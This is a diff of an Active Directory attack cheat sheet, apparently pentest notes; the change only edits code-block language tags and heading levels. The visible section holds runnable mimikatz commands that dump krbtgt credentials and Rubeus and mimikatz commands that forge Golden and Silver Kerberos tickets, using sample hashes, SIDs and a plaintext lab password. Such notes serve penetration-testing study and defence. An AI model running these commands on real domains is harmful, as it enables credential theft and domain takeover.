@@ -382,30 +382,32 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 - A Golden Ticket attack consist on the creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user through the use of the NTLM hash of the Active Directory (AD) `krbtgt` account.
 
 ### Attack
-```shell
+```powershell
 # get krbtgt keys
 ## from DC memory (LSA) 
 ./mimikatz "lsadump::lsa /inject /name:krbtgt"
 ## using dcsync 
 ./mimikatz "privilege::debug" "lsadump::dcsync /domain:eagle.local /user:krbtgt"
 
-# powerview
-## get domain sid
+
+# Golden Ticket
+## powerview
+### get domain sid
 Get-DomainSID
-## get user rid
+### get user rid
 Get-DomainUser -Identity Administrator 
 
-# Rubeus
-## get info about user (instead of powerview)
+## Rubeus
+### get info about user (instead of powerview)
 Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /printcmd
-## use the info to forge a ticket
-## /id is user(that we want to impersonate) rid
-## /pgid is group user rid
-## /netbios is domain name
-## check the rest of params in https://github.com/GhostPack/Rubeus?tab=readme-ov-file#ticket-forgery
+### use the info to forge a ticket
+### /id is user(that we want to impersonate) rid
+### /pgid is group user rid
+### /netbios is domain name
+### check the rest of params in https://github.com/GhostPack/Rubeus?tab=readme-ov-file#ticket-forgery
 Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED
 
-# mimikatz
+## mimikatz
 ./mimikatz  "kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt"
 ./mimikatz "kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt"
 
@@ -414,7 +416,7 @@ Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD
 ## Silver ticket
 This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges.
 
-```shell
+```powershell
 # Rubeus
 ## Forge TGS | creduser and credpassword are user have access to ldap info used to query info to forge TGS
 Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob  /domain:rubeus.ghostpack.local /ptt
